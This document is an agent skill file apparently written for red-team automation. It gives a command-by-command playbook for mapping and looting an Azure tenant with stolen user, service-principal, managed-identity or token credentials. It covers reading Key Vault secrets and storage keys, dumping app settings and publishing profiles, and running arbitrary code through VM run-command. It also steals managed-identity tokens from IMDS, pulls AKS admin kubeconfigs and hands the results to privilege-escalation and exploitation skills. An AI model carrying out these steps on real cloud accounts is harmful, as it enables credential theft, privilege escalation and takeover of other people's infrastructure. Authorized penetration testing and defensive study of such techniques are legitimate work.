---
name: azure-enumeration
description: Exhaustive Azure resource-plane (ARM) enumeration with the az CLI and ARM REST — authenticate as user/service-principal/managed-identity, sweep every subscription for VMs, storage, Key Vaults, App Services, AKS, SQL, automation accounts, role assignments, and public endpoints, then emit rupu work units for exploitation handoff. Use when you hold any Azure credential (password, SP secret/cert, managed identity, stolen ARM token) and need to map and loot the resource plane.
license: Apache-2.0
metadata:
  author: Section9Labs
  domain: cloud
---

# Azure Resource-Plane Enumeration

Map everything an Azure identity can reach on the ARM (management) plane, extract
secrets and command-execution surface, and hand structured work units to sibling
skills. Directory-plane (Entra ID / AAD) attack — users, groups, app registrations,
consent abuse — is the sibling skill `azure-entra-id`; this skill stays on
`management.azure.com`. Umbrella: `cloud-security`.

## 1. Authenticate and establish identity

Pick the login mode matching the credential you hold:

```bash
# Interactive / stolen user creds (device code works through proxies):
az login                       # browser
az login --use-device-code     # device-code flow
az login -u user@example.com -p 'Passw0rd!'   # ROPC, fails on MFA/CA

# Service principal — appId + secret or certificate:
az login --service-principal -u 11111111-2222-3333-4444-555555555555 \
  -p 'SP_SECRET' --tenant example.onmicrosoft.com --allow-no-subscriptions
az login --service-principal -u <appId> -p /path/cert.pem --tenant <t> --allow-no-subscriptions

# Managed identity — run ON the compromised VM/App Service/Function:
az login --identity                                   # system-assigned
az login --identity --username <client-id-of-UAMI>    # user-assigned
```

Always pass `--allow-no-subscriptions`: an SP with no subscription role can still
hold Graph roles or Key Vault data-plane access, and the login must not fail.

Confirm who you are and what tokens you can mint:

```bash
az account show -o json                     # current context: tenant, sub, user type
az account list --all -o table              # EVERY subscription this identity sees
az account tenant list -o table             # tenants trusting these creds
az account get-access-token --resource https://management.azure.com/   # ARM token
az account get-access-token --resource https://graph.microsoft.com/    # Graph token -> feed azure-entra-id
az account get-access-token --resource https://vault.azure.net         # Key Vault data plane
az account get-access-token --resource https://storage.azure.com/      # Storage data plane
```

Decode the ARM token JWT payload (base64) to read `oid`, `appid`, `xms_mirid`
(managed identity resource id) — that tells you exactly which principal you are.
If you hold a raw stolen token instead of creds, skip `az login` and drive ARM REST
directly with `Authorization: Bearer <token>` (see `references/arm-sweep.md` §9).

## 2. Scope: subscriptions, management groups, RBAC

```bash
az account management-group list -o table            # MG tree if visible
az role assignment list --all -o json                # all assignments in current sub
az role assignment list --scope /providers/Microsoft.Management/managementGroups/<mg> -o json
az role assignment list --assignee <my-oid> --all -o json   # what *I* hold
az role definition list --custom-role-only true -o json      # custom roles = odd privileges
```

Read role assignments for privesc leads: `Owner`, `Contributor`,
`User Access Administrator`, `Virtual Machine Contributor` (run-command),
`Key Vault Administrator`, `Storage Account Contributor` (keys list), and any
custom role containing `*/write`, `Microsoft.Authorization/roleAssignments/write`,
or `listKeys/action`. Feed these to `cloud-privilege-escalation`.

## 3. Full resource sweep — iterate EVERY subscription

For each subscription from `az account list --all`:

```bash
az account set --subscription <subId>
az resource list -o json          # full inventory: type, name, RG, location, tags
az group list -o table
```

Then the high-value services (full commands + what leaks in
`references/arm-sweep.md`):

| Surface | Commands | Why it matters |
|---|---|---|
| VMs | `az vm list -d -o json`, `az vm list-ip-addresses` | public IPs, identities attached, run-command exec |
| Run-command | `az vm run-command invoke -g RG -n VM --command-id RunShellScript --scripts 'id; env'` | arbitrary code as root/SYSTEM = loot IMDS tokens, pivot |
| Storage | `az storage account list`, `az storage account keys list -n ACCT`, `az storage account show -n ACCT --query allowBlobPublicAccess` | full-control keys, public blob exposure |
| App Service | `az webapp list`, `az webapp config appsettings list -g RG -n APP`, `az webapp config connection-string list`, `az webapp deployment list-publishing-profiles` | plaintext secrets, SCM creds, kudu access |
| Functions | `az functionapp list`, `az functionapp config appsettings list -g RG -n FN` | same secret surface + master keys |
| Key Vault | `az keyvault list`, `az keyvault secret list --vault-name KV`, `az keyvault secret show --vault-name KV -n SECRET` | the crown jewels; try even on 403-looking vaults |
| SQL/Cosmos | `az sql server list`, `az sql db list -s SRV -g RG`, `az cosmosdb list`, `az cosmosdb keys list -n DB -g RG` | connection endpoints, master keys |
| AKS | `az aks list`, `az aks get-credentials -g RG -n CLUSTER --admin` | kubeconfig -> cluster takeover |
| Networking | `az network public-ip list -o json`, `az network nsg list`, `az network lb list`, `az network application-gateway list` | external attack surface, open NSG rules |
| Automation | `az automation account list`, `az automation runbook list`, runbook content + variables via `az rest` | runbooks run as Run-As account; variables hold creds |
| ACR | `az acr list`, `az acr credential show -n REG`, `az acr repository list -n REG` | registry creds, image pull -> secrets in layers |
| Managed identities | `az identity list -o json` | which UAMIs exist and where they can be attached |

Anything with no CLI verb — ARM REST catches everything:

```bash
az rest --method get \
  --url "https://management.azure.com/subscriptions/<subId>/providers?api-version=2021-04-01"
az rest --method get \
  --url "https://management.azure.com/subscriptions/<subId>/resources?api-version=2021-04-01"
az rest --method post \
  --url "https://management.azure.com/<resourceId>/listKeys?api-version=<ver>"
```

`az rest` auto-attaches the ARM token for `management.azure.com` URLs. POST
`list*` actions (`listKeys`, `listSecrets`, `listCallbackUrl`) are the universal
secret-extraction pattern on ARM — many roles that can't `GET` secrets can still
`POST list*`. Resource Graph gives tenant-wide inventory in one query:
`az graph query -q "Resources | project id,type,name,subscriptionId" --first 1000`
(extension; falls back to per-sub `az resource list`).

## 4. Automated sweep -> inventory -> work units

```bash
python3 scripts/az_enum.py --all-subscriptions -o out/az-inventory.json
python3 scripts/az_enum.py --subscription <subId> --services vm,storage,keyvault,webapp -o out/az-inventory.json
python3 scripts/az_to_work_units.py out/az-inventory.json -o out/work-units.json --assets out/assets.json
```

`az_enum.py` shells out to `az ... -o json` across every subscription and service
and writes one normalized inventory JSON. `az_to_work_units.py` converts it into a
bare JSON array of `{"id","title","targets","hints"}` work units — one per public
endpoint, storage account, key vault, VM-with-run-command, privileged role
assignment, app with settings — plus an assets list. **Every run of this skill ends
with `out/work-units.json`**; rupu wiring (fan-out, `assets.mark`,
`findings.report`) is in `references/rupu.md`.

## 5. Read the output / handoff

- **Graph token obtained or directory roles seen** -> `azure-entra-id` (users,
  groups, app consent, directory privesc).
- **Storage accounts / public blob access** -> `cloud-storage-exposure` with
  account names + keys from `az storage account keys list`.
- **App settings, connection strings, runbook content, publish profiles** ->
  `trufflehog` over the dumped JSON/files for credential extraction.
- **VM run-command works** -> execute on-box, curl Azure IMDS
  (`http://169.254.169.254/metadata/identity/oauth2/token?...&resource=https://management.azure.com/`)
  to steal the VM's managed-identity token -> `metadata-ssrf-pivot`, then re-run
  this skill as that identity.
- **Role assignments with write/elevation potential, UAMI attach rights,
  automation Run-As** -> `cloud-privilege-escalation`.
- **AKS kubeconfig** -> Kubernetes attack flow; **ACR creds** -> image loot.
- Record subscriptions, principals, resources, endpoints, and secrets as assets;
  report confirmed exposures — shapes in `references/rupu.md`.

Depth: `references/arm-sweep.md` (per-service full command set, raw REST,
token-only operation, what leaks where).
